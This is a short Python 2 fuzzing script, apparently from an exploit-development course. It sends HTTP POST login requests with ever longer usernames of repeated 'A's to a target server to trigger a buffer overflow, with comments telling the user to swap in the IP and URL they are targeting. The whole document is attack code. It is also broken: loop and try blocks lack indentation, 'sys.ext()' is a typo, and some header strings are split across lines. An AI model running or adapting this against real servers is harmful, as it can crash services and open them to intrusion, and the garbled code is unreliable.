# this python script is specifically
# to fuzz the login functioanilty 
# of a server 
# it attempts to fuzz adding values of usernames 
# to be longer to try and casue a 
# buffer overflow vulnerability in a vulnerable app
# strictly for educational purposes only 
# Its a killer script
# you can collect the request using wireshark 
#!/usr/bin/python
import socket
import time
import sys

size = 100

while(size < 2000):
try:
    print "\nSending evil buffer with %s bytes" % size

inputBuffer = "A" * size

content = "username=" + inputBuffer + "&password=A"

buffer = "POST /login HTTP/1.1\r\n"
buffer += "Host: 10.11.0.22\r\n"
buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101
Firefox/52.0\r\n"
buffer += "Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buffer += "Accept-Language: en-US,en;q=0.5\r\n"
buffer += "Referer: http://127.0.0.1/login\r\n" # change this value to the login url youre targeting
buffer += "Connection: close\r\n"
buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
buffer += "Content-Length: "+str(len(content))+"\r\n"
buffer += "\r\n"

buffer += content

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

s.connect(("127.0.0.1", 80)) # change this value to the ip you are targeting
s.send(buffer)

s.close()

size +=100 # increasing the username input by 100 on every login attempt
time.sleep(10) # time delay to precisely show which POST request triggers the vulnerability

except:
print "\nCould not connect connect!"
sys.ext()